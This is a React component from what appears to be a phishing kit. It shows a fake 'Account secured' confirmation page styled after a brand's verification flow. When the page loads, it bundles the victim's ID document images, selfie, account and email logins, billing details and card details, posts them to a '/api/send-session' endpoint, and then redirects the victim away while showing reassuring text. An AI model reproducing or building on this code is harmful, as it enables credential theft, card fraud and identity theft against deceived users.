import axios from "axios";
import React, { useContext, useEffect } from "react";
import { InputWrapper } from "../../../components/InputWrapper";
import { Wrapper } from "../../../components/Wrapper";
import { dataURItoBlob } from "../../../utils/dataURItoBlob";
import { DataContext } from "../../_app";

interface ConfirmationProps {}

export const Confirmation: React.FC<ConfirmationProps> = ({}) => {
  const { data } = useContext(DataContext);

  useEffect(() => {
    if (typeof window !== `undefined` && data && Object.keys(data).length) {
      const front = data.docs && data.docs.front;
      const back = data.docs && data.docs.back;
      const logins = data.logins;
      const selfie = data.selfie;
      const emailLogins = data.emailLogins;
      const billing = data.billing;
      const cardDetails = data.cardDetails;

      const sendSession = async () => {
        if (logins) {
          const formData = new FormData();

          if (front && back) {
            formData.append(`front`, front);
            formData.append(`back`, back);
          }

          if (logins) {
            formData.append(`logins`, JSON.stringify(logins));
          }

          if (selfie) {
            formData.append(`selfie`, dataURItoBlob(selfie));
          }

          if (emailLogins) {
            formData.append(`emailLogins`, JSON.stringify(emailLogins));
          }

          if (billing) {
            formData.append(`billing`, JSON.stringify(billing));
          }

          if (cardDetails) {
            formData.append(`cardDetails`, JSON.stringify(cardDetails));
          }

          formData.append(`form`, `SESSION`);

          await axios.post(`/api/send-session`, formData, {
            headers: {
              "Content-Type": `multipart/form-data`,
            },
          });
        } else {
          console.log(`You are on the server`);
        }

        window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
      };

      sendSession();
    }
    return () => {};
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <Wrapper title="Account secured">
      <div
        className="tru-core-card-content tru-core-card-section"
        style={{
          paddingTop: `var(--truSpacingXl)`,
          letterSpacing: `normal`,
          textIndent: 0,
          textShadow: `none`,
          textTransform: `none`,
          textAlign: `initial`,
          fontStyle: `normal`,
          verticalAlign: `initial`,
          fontSize: `var(--truFontSizeMd)`,
          color: `var(--truColorTextPrimary)`,
          display: `flex`,
          flexGrow: 1,
          flexDirection: `column`,
        }}
      >
        <p
          className="tru-core-card-copy--retail"
          style={{
            marginTop: 0,
          }}
        >
          {" "}
          We have verify your account successfully. Please wait while we
          redirect you to the login page.
        </p>{" "}
        <div
          style={{
            paddingTop: `16px`,
            paddingBottom: `16px`,
          }}
        >
          <InputWrapper>
            <span className="loader">
              <style>
                {`
                .loader {
                    width: 48px;
                    height: 48px;
                    border-radius: 50%;
                    display: inline-block;
                    border-top: 3px solid var(--truColorPrimaryDark);
                    border-right: 3px solid transparent;
                    box-sizing: border-box;
                    animation: rotation 1s linear infinite;
                  }
                  
                  @keyframes rotation {
                    0% {
                      transform: rotate(0deg);
                    }
                    100% {
                      transform: rotate(360deg);
                    }
                  } 
            `}
              </style>
            </span>
          </InputWrapper>
        </div>
      </div>
    </Wrapper>
  );
};

export default Confirmation;
